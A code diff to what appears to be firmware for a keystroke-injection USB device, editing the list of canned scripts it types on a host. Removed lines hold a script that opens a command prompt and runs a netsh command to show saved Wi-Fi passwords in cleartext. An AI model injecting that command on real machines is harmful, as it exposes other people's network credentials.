@@ -2864,14 +2864,7 @@ String getScriptFromUser() {
                     return "GUI r\nDELAY 500\nSTRING calc\nDELAY 300\nENTER";
                 } else if (scriptName == "Open CMD/Terminal") {
                     return "GUI r\nDELAY 500\nSTRING cmd\nDELAY 300\nENTER";
-                } else if (scriptName == "WiFi Credentials") {
-                    return "GUI r\nDELAY 500\nSTRING cmd\nDELAY 300\nENTER\nDELAY 500\nSTRING netsh wlan "
-                           "show profile name=* key=clear\nDELAY 300\nENTER";
-                else if (scriptName == "Rickroll") {
-                    return "GUI r\nDELAY 500\nSTRING https://www.youtube.com/watch?v=dQw4w9WgXcQ\nDELAY "
-                           "300\nENTER";
                 }
-            }
         }
         delay(50);
     }
